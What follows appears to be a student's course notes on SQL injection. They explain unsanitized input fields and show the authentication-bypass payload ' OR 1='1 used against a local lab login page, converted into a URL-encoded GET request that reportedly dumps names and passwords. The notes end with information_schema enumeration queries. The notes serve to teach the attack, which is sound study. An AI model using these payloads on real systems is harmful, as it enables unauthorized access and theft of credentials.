### Ok let's figure this out. 
```bash
.Structured query language - ANSI Standards
.Additional commands added by vendors, Relational
.Commands to use: SELECT (Extracts data from a database) , UNION (Used to COMBINE the result-set of TWO OR MORE SELECT STATEMENTS)
.SQL INJECTIONS - CONSIDERATIONS
.Require valid SQL Queries
.Fully patched systems can be vulnerable due to misconfiguration.
.Input Field Sanitization (If inputted correctly we cannot inject)
.String vs Integer Values
.Is the INFORMATION_SCHEMA Database avalible? (For this course, yes.)
.GET and POST Requests.
### Unsanitized vs Sanitized Fields:
.Unsanitized: input fields can be found using a single quote = '
.Will return extraneous information
.' closes a variable, to allow for additional statements/clauses
.May show no errors
### Server Side Query Processing
.User enters JohnDoe243 in the name form field and pass1234 in the pass form field.
The server-side query that would be passed to mySQL from PHP would be:
.Select id FROM users WHERE name='$name' AND pass='pass$';
SELECT id FROM users WHERE name='JohnDoe243' AND pass='pass1234'
The AND means both things must be correct
### Example - Injecting Your Statement
User enters TOM' OR 1='1 in the name and pass fields
truth statement: tom' OR 1='1
Server Side query executed would appear like
SELECT id FROM   USERS where NAME='TOM' or 1='1' and PASS='TOM' or 1='1'
### DEMO
#Went to website, for credentials entered
username: ' OR 1='1
password: ' OR 1='1
#This is a post request
# Press F12, go into network and complete login, click on POST, view REQUEST (Captures payload of the request), click RAW, and you will find the the request in a URL format.
ex: username=%27+OR+1%3D%271&passwd=%27+OR+1%3D%271
# From there, we are going to view more information and transform this into a GET request.
#after 127.0.0.1:1111/login.php, we add a "/?" and add the url.
http://127.0.0.1:1111/login.php/?username=%27+OR+1%3D%271&passwd=%27+OR+1%3D%271
#This revealed an Array with a list of names and passwords
```
### DB Interactions DEMO: SQL Commands
```bash
mysql #drops you into sql server
### Golden Statement
select table_schema,table_name,column_name from information_schema.colums
  <NAME OF COLUMN>,<NAME OF COLUMN>,<NAME OF COLUMN> from <NAME OF DATABASE>.<NAME OF TABLE>
#The comma seperated values are names of columns, before the "." is the name of database, after is the name of table.
#SQL is hiaerachel, that goes DATABASE > TABLE > COLUMN
#In this example the database is named INFORMATION_SCHEMA
#the table is COLUMNS
#The columns are TABLE_SCHEMA, TABLE_NAME, COLUMN NAME
#lets view it
use information_schema ;
show tables ;
show columns from columns ;
#I want to show the table columns and view info from columns
Table schema is name of database , when selecting table name, we are getting all table names, when selecting column name, we are getting the names of all the columns.



